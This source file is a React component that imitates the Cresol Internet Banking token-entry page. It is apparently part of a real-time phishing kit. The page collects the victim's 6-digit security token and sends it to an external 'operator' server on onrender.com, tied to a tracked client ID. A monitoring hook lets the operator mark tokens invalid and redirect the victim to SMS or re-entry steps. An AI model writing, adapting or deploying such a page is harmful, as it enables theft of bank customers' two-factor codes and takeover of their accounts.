import React, { useState, useEffect } from "react";
import { ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.png";
import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
import { useClientMonitoring } from "@/hooks/useClientMonitoring";

const TokenPage = () => {
  const navigate = useNavigate();
  const clientMonitoring = useClientMonitoring();
  const [token, setToken] = useState("");
  const [clientId, setClientId] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isInvalid, setIsInvalid] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");

  useEffect(() => {
    const storedClientId = localStorage.getItem('clientId');
    console.log(`[TOKEN] [${clientMonitoring.isProduction ? 'PROD' : 'DEV'}] Inicializando página TOKEN`);
    
    if (storedClientId) {
      setClientId(storedClientId);
      console.log('[TOKEN] ClientId recuperado:', storedClientId);
      
      // Aguardar um momento antes de iniciar o monitoramento para garantir que a página esteja totalmente carregada
      setTimeout(() => {
        clientMonitoring.startMonitoring(storedClientId, 'token');
      }, 500);
    } else {
      console.log('[TOKEN] ClientId não encontrado, redirecionando para home');
      navigate('/home');
    }

    return () => {
      console.log('[TOKEN] Cleanup: parando monitoramento');
      clientMonitoring.stopMonitoring();
    };
  }, [clientMonitoring, navigate]);

  const handleTokenChange = (value: string) => {
    setToken(value.replace(/\D/g, '').slice(0, 6));
    if (isInvalid) {
      setIsInvalid(false);
      setErrorMessage("");
    }
  };

  const handleInvalidToken = () => {
    console.log('[TOKEN] Token inválido detectado');
    setToken("");
    setIsLoading(false);
    setIsInvalid(true);
    setErrorMessage("Token inválido. Tente novamente.");
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!clientId) {
      console.log('[TOKEN] ClientId não disponível para envio do token');
      return;
    }

    try {
      console.log('[TOKEN] Enviando token:', token);
      
      setIsLoading(true);
      setIsInvalid(false);
      setErrorMessage("");
      
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 15000);

      const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
        method: 'PATCH',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          response: token
        }),
        signal: controller.signal
      });

      clearTimeout(timeoutId);

      if (response.ok) {
        console.log('[TOKEN] Token enviado com sucesso - aguardando resposta do monitoramento');
        // O monitoramento detectará ir_sms ou inv_2fa automaticamente
      } else {
        console.log('[TOKEN] Erro ao enviar token:', response.status);
        setIsLoading(false);
        setErrorMessage("Erro ao enviar token. Tente novamente.");
      }
    } catch (error) {
      console.log('[TOKEN] Erro durante envio do token:', error);
      setIsLoading(false);
      setErrorMessage("Erro de conexão. Verifique sua internet.");
    }
  };

  // Configurar callback para token inválido
  useEffect(() => {
    window.handleInvalidToken = handleInvalidToken;
    
    return () => {
      delete window.handleInvalidToken;
    };
  }, []);

  const handleBack = () => {
    console.log('[TOKEN] Voltando para SMS');
    clientMonitoring.stopMonitoring();
    navigate("/sms");
  };

  return (
    <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
      {/* Main Content Container */}
      <div className="w-full lg:w-1/2 flex flex-col items-center px-4 sm:px-6 lg:px-[7%] pt-8 lg:pt-36 pb-8 relative">
        <div className="max-w-md w-full mx-auto">
          {/* Debug info em desenvolvimento */}
          {!clientMonitoring.isProduction && (
            <div className="mb-4 p-2 bg-gray-100 text-xs">
              <div>Env: {clientMonitoring.isProduction ? 'PROD' : 'DEV'}</div>
              <div>Monitoring: {clientMonitoring.isMonitoring ? 'ON' : 'OFF'}</div>
              <div>ClientId: {clientId}</div>
            </div>
          )}

          {/* Botão Voltar */}
          <button
            onClick={handleBack}
            className="flex items-center text-gray-600 hover:text-gray-800 mb-6 transition-colors min-h-[44px] p-1"
          >
            <ArrowLeft size={20} className="mr-2" />
            <span className="text-base md:text-lg">Voltar</span>
          </button>

          
          <img
            src={cresolLogo}
            alt="Cresol"
            className="h-8 md:h-10 mb-6"
          />

          <h1 className="text-xl md:text-2xl font-semibold text-gray-600 mb-3 text-center lg:text-left">Token de Acesso</h1>
          <p className="text-base md:text-lg text-gray-600 mb-8 text-center lg:text-left">
            Digite o token gerado no seu dispositivo de segurança ou aplicativo.
          </p>

          <form onSubmit={handleSubmit} className="mt-6">
            <div className="mb-6">
              <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Token</label>
              <input
                type="text"
                className={`w-full h-12 px-3 border rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest ${
                  isInvalid ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="000000"
                value={token}
                onChange={(e) => handleTokenChange(e.target.value)}
                maxLength={6}
                autoComplete="one-time-code"
              />
              {isInvalid && (
                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
              )}
            </div>

            <button
              type="submit"
              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6 disabled:opacity-70 flex items-center justify-center"
              style={{
                background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                borderRadius: "30px",
              }}
              disabled={token.length !== 6 || isLoading}
            >
              {isLoading ? (
                <div className="flex items-center">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Validando...
                </div>
              ) : (
                "Acessar"
              )}
            </button>

            <div className="text-center">
              <p className="text-sm md:text-base text-gray-600">
                Problemas com seu token?{" "}
                <a href="#" className="text-orange-500 hover:text-orange-600 transition font-medium min-h-[44px] inline-block py-2">
                  Entre em contato
                </a>
              </p>
            </div>
          </form>

          {/* Rodapé */}
          <div className="mt-12 text-center lg:text-left text-xs text-gray-800">
            <div className="font-semibold">Cresol Internet Banking - 2025</div>
            <div className="">Versão: 12.4.3.501 (12.4.3-501)</div>
          </div>
        </div>
      </div>

      {/* Right: Imagem da mulher - Hidden on mobile, shown on lg+ */}
      <div className="hidden lg:block lg:w-1/2 bg-[#f5f6f7] relative overflow-hidden">
        <img
          src={womanImage}
          alt="Mulher segurando celular"
          className="w-full h-full object-cover"
        />
      </div>
    </div>
  );
};

export default TokenPage;
